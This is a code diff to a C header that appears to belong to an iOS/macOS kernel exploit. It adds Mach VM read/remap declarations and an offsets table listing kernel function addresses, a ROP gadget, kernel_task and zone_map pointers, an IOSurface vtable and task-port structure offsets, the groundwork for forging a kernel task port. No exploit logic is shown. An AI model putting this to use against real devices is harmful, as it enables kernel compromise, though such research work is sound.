@@ -48,8 +48,56 @@ extern kern_return_t bootstrap_look_up(mach_port_t bp, char *name, mach_port_t *
 extern mach_port_t mach_reply_port(void);
 extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
 extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);
+extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
 extern kern_return_t mach_vm_protect(task_t task, mach_vm_address_t addr, mach_vm_size_t size, boolean_t set_max, vm_prot_t new_prot);
 extern kern_return_t mach_vm_map(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur, vm_prot_t max, vm_inherit_t inheritance);
+extern kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
+
+typedef struct {
+    struct {
+        kptr_t kernel_image_base;
+    } constant;
+
+    struct {
+        kptr_t copyin;
+        kptr_t copyout;
+        kptr_t current_task;
+        kptr_t host_priv_self;
+        kptr_t get_bsdtask_info;
+        kptr_t vm_map_wire_external;
+
+        kptr_t ipc_port_alloc_special;
+        kptr_t ipc_kobject_set;
+        kptr_t ipc_port_make_send;
+    } funcs;
+
+    struct {
+        kptr_t add_x0_x0_ret;
+    } gadgets;
+
+    struct {
+        kptr_t zone_map;
+        kptr_t kernel_task;
+    } data;
+
+    struct {
+        kptr_t iosurface_root_userclient;
+    } vtabs;
+
+    struct {
+        uint32_t is_task_offset;
+        uint32_t task_itk_self;
+        uint32_t itk_registered;
+        uint32_t ipr_size;
+        uint32_t sizeof_task;
+    } struct_offsets;
+
+    struct {
+        uint32_t create_outsize;
+        uint32_t create_surface;
+        uint32_t set_value;
+    } iosurface;
+} offsets_t;
 
 typedef volatile struct {
     uint32_t ip_bits;
